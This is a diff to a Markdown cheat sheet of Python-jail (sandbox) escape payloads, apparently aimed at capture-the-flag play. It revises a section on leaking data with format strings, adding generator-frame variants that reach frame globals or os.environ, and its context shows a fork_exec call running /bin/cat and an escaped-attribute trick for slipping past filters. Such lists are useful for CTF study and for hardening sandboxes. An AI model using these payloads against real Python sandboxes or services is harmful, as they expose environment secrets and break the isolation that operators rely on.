@@ -254,15 +254,22 @@ __builtins__.__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat", 
 
 ```
 
-### Leak data using format strings
+### format strings
+## Leak data
 ```py
 "{0.__self__.help.__call__.__globals__[sys].modules[os].environ}".format(print)
 "{a.__self__.help.__call__.__globals__[sys].modules[os].environ}".format_map({"a":print})
+'{0.gi_frame.f_globals}'.format((x for x in ()))
+'{a.gi_frame.f_globals}'.format_map({"a":(x for x in ())})
+'{a.gi_frame.f_globals}'.format_map(dict(a=(x for x in ())))
+[y:=[],y.extend([('{0.gi_frame.f_back.f_back.f_back}'.format(x) for x in y)]),[x for x in y[0]][0]]
 "{0.gi_frame.f_builtins[help].__call__.__globals__[sys].modules[os].environ}".format((x for x in ()))
 
 # this also works
 "{0\x2e\x5f\x5fclass\x5f\x5f}".format(0)
 ```
+
+## 
 
 ### OOB Read using LOAD_FAST
 ```py
@@ -394,3 +401,4 @@ https://github.com/python/cpython/issues/103051
 # Credits
  - https://shirajuki.js.org/blog/pyjail-cheatsheet
  - https://jbnrz.com.cn/index.php/2024/05/19/pyjail/
+
